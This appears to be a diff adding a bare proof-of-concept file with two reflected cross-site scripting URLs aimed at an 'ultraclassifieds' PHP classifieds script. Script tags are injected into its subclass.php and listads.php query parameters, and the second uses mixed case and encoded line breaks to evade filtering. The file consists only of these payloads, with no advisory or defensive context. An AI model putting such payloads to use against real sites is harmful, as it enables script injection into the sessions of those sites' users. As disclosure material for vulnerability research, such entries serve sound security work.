@@ -1,0 +1,7 @@
+
+
+http://www.example.com/ultraclassifieds/subclass.php?c=18&amp;cname=1&lt;script&gt;alert(308954043099)&lt;/script&gt; 
+
+http://www.example.com/ultraclassifieds/listads.php?c=69&amp;cn=apartments&amp;sn=1&gt;&quot;&gt;&lt;ScRiPt %0A%0D&gt;alert(317944247288)%3B&lt;/ScRiPt&gt;
+
+
